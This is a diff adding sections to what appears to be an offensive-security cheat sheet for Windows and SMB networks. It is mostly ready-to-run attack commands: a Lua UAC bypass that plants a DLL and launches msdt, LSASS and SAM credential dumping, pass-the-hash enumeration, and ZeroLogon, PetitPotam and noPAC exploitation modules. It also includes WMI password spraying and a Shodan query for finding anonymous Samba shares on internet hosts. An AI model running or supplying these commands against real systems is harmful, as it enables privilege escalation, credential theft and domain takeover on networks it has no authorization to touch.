@@ -451,7 +451,16 @@ wevutil qe security /f:text
 Get-EventLog -LogName Security | Format-List -Property *
 ```
 
-## TCPDump
+## Lua UAC Bypass:
+
+```
+-- auto elevate UAC bypass only on Windows 10.
+is.popen("c:\windows\system32\cmd.exe /c 'mkdir %appdata%\..\Local\Microsoft\WindowsApps'")
+is.popen("c:\windows\system32\cmd.exe /c 'copy Tsutsuji_x64.dll %appdata%\..\Local\Microsoft\WindowsApps\BluetoothDiagnosticUtil.dll'")
+is.popen("c:\windows\system32\cmd.exe /c 'c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes'")
+```
+
+## TCPDump:
 
 ```
 tcpdump -i <interface> # Capture, can use "any" 
@@ -702,6 +711,17 @@ Depending on the EDR, it may be sufficient to simply add quotations around the p
 procdump.exe -accepteula -ma “lsass.exe” out.dmp
 ```
 
+## Dumping LSASS With NetExec:
+
+Using Lsassy and Nanodump:
+```
+nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
+```
+
+```
+nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
+```
+
 ## Stealing Signatures with SigThief:
 
 Download: https://github.com/secretsquirrel/SigThief
@@ -721,6 +741,18 @@ Downloads text formatted files
 
 ```
 certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
+```
+## Shodan for SMB:
+
+SMB ( Server Message Block ) authentication without credentials, also known as anonymous SMB access, allows users to access shared resources on a network without providing username or passwords. This can be useful for accessing shared folders that have been configured to allow anonymous access.
+
+```
+"Authentication: disabled" port:445 product:"Samba" 
+```
+
+```
+smbclient -L //200.x.x.29/ -N  
+smbclient //200.x.x.29/info
 ```
 
 ## Plundering Account Information with RPCClient and SMBClient:
@@ -873,4 +905,94 @@ Connect to target using local account:
 
 ```
 crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth
+```
+
+Dump local SAM hashes:
+
+```
+crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth --sam
+```
+
+#### Enumerate Everything:
+
+> [!NOTE]
+> Some enumeration methods may fail depending on the privilege level of the user you're authenticating as
+
+Password authentication:
+
+```
+crackmapexec smb CIDR/IP -d targetdomain.tld -u username -p 'password' \
+--shares \
+--sessions \
+--disks \
+--loggedon-users \
+--users \
+--groups \
+--computers \
+--local-groups \
+--pass-pol
+```
+
+Pass the hash:
+
+```
+crackmapexec smb CIDR/IP -d targetdomain.tld -u username -H lm-hash:nt-hash \
+--shares \
+--sessions \
+--disks \
+--loggedon-users \
+--users \
+--groups \
+--computers \
+--local-groups \
+--pass-pol
+```
+
+#### Dump Files:
+
+Using the option `-o READ_ONLY=false` all files will be copied on the host
+
+```
+crackmapexec smb targets.txt -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false
+```
+
+## NetExec:
+
+ZeroLogon:
+
+```
+nxc smb <ip> -u '' -p '' -M zerologon
+```
+
+PetitPotam:
+
+```
+nxc smb <ip> -u '' -p '' -M petitpotam
+```
+
+noPAC:
+
+```
+nxc smb <ip> -u 'user' -p 'pass' -M nopac
+```
+
+Map Network Hosts:
+
+```
+nxc smb 192.168.1.0/24
+```
+
+Checking if Null Session is enabled on the network, can be very useful on a Domain Controller to enumerate users, groups, password policy etc:
+
+```
+nxc smb 10.10.10.161 -u '' -p ''
+nxc smb 10.10.10.161 --pass-pol
+nxc smb 10.10.10.161 --users
+nxc smb 10.10.10.161 --groups
+```
+
+WMI Spray:
+
+```
+nxc wmi 10.10.10.0/24 -u userfile -p passwordfile
 ```
